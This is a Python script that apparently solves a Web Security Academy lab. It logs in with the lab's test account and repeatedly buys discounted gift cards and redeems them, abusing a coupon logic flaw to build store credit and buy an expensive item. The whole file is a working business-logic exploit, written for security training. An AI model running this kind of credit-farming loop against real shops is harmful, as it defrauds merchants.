import requests
from bs4 import BeautifulSoup

url = "https://0a5000ee03acd50380b65309008400ea.web-security-academy.net/"
session = requests.Session()
coupon = "SIGNUP30"

def get_csrf_token(path):
    r = session.get(url + path)
    soup = BeautifulSoup(r.text, 'html.parser')
    return soup.find(attrs={"name": "csrf"}).get("value")

def get_gift_card(page):
    soup = BeautifulSoup(page, 'html.parser')
    return soup.find_all("td")[8].get_text()

def get_store_credit():
    r = session.get(url + "my-account")
    soup = BeautifulSoup(r.text, 'html.parser')
    return soup.find_all("strong")[0].get_text()

def buy_product_with_coupon(product_id):
    data_cart = {"productId": product_id, "redir": "PRODUCT", "quantity": "1"}
    session.post(url + "cart", data=data_cart)
    csrf_token = get_csrf_token("cart")
    data_coupon = {"csrf": csrf_token, "coupon": coupon}
    session.post(url + "cart/coupon", data=data_coupon)
    data_checkout = {"csrf": csrf_token}
    return session.post(url + "cart/checkout", data=data_checkout)

# Log In
data = {"csrf": get_csrf_token("login"), "username": "wiener", "password": "peter"}
r = session.post(url + "login", data=data)

# Buy and redeem gift cards
counter = 1
while True:
    r = buy_product_with_coupon("2")
    data = {"csrf": get_csrf_token("my-account"), "gift-card": get_gift_card(r.text)}
    session.post(url + "gift-card", data=data)
    print(get_store_credit())
    if counter == 279:
        break
    counter += 1

# Buy 1337 jacket
buy_product_with_coupon("1")
